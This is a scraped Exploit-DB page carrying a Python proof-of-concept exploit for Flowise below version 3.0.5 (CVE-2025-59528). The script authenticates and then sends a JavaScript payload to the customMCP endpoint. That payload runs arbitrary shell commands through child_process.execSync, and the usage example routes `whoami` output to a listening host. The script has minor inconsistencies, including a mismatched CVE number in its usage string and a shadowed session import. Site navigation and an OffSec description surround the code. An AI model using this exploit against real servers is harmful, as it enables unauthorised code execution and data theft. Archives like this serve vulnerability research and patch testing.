---
title: [webapps] Flowise 3.0.4 - Remote Code Execution (RCE)
url: https://www.exploit-db.com/exploits/52440
source: Exploit-DB.com RSS Feed
date: 2025-10-31
fetch_date: 2025-11-01T03:11:19.467490
---

# [webapps] Flowise 3.0.4 - Remote Code Execution (RCE)

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Flowise 3.0.4 - Remote Code Execution (RCE)

#### EDB-ID:

###### 52440

#### CVE:

###### [2025-59528](https://nvd.nist.gov/vuln/detail/CVE-2025-59528)

---

**EDB Verified:**

#### Author:

###### [nltt0](/?author=12104)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-10-31

---

**Vulnerable App:**

```
# Exploit Title: Flowise 3.0.4 - Remote Code Execution (RCE)
# Date: 10/11/2025
# Exploit Author: [nltt0] (https://github.com/nltt-br))
# Vendor Homepage: https://flowiseai.com/
# Software Link: https://github.com/FlowiseAI/Flowise
# Version: < 3.0.5
# CVE: CVE-2025-59528

from requests import post, session
from argparse import ArgumentParser

banner = r"""
_____       _                              _____
/  __ \     | |                            /  ___|
| /  \/ __ _| | __ _ _ __   __ _  ___  ___ \ `--.
| |    / _` | |/ _` | '_ \ / _` |/ _ \/ __| `--. \
| \__/\ (_| | | (_| | | | | (_| | (_) \__ \/\__/ /
\____/\__,_|_|\__,_|_| |_|\__, |\___/|___/\____/
                            __/ |
                          |___/

                by nltt0
"""

try:
    parser = ArgumentParser(description='CVE-2025-59528 [Flowise < 3.0.5]', usage="python CVE-2025-58434.py --email xtz@local --password Test@2025 --url http://localhost:3000 --cmd \"http://localhost:1337/`whoami`\"")
    parser.add_argument('-e', '--email', required=True, help='Registered email')
    parser.add_argument('-p', '--password', required=True)
    parser.add_argument('-u', '--url', required=True)
    parser.add_argument('-c', '--cmd', required=True)

    args = parser.parse_args()
    email = args.email
    password = args.password
    url = args.url
    cmd = args.cmd

    def login(email, url):
        session = session()
        url_format = "{}/api/v1/auth/login".format(url)
        headers = {"x-request-from": "internal", "Accept-Language": "pt-BR,pt;q=0.9", "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "Origin": "http://workflow.flow.hc", "Referer": "http://workflow.flow.hc/signin", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
        data={"email": email, "password": password}
        r = session.post(url_format, headers=headers, json=data)
        return session, r

    def rce(email, url, password, cmd):
        session, status_code = login(email, url)
        url_format = "{}/api/v1/node-load-method/customMCP".format(url)
        command = f'({{x:(function(){{const cp = process.mainModule.require("child_process");cp.execSync("{cmd}");return 1;}})()}})'

        data = {
            "loadMethod": "listActions",
            "inputs": {
                "mcpServerConfig": command
            }
        }

        r = session.post(url_format, json=data)

        if r.status_code == 401:
            session.headers["x-request-from"] = "internal"
            session.post(url_format, json=data)

        print(f"[x] Command executed [{cmd}]")

    rce(email, url, password, cmd)

except Exception as e:
    print('Error in {}'.format(e))
```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| --- | --- | --- | --- |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) |

Databases

[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links

[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites

[OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com/)

Solutions

[Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known a...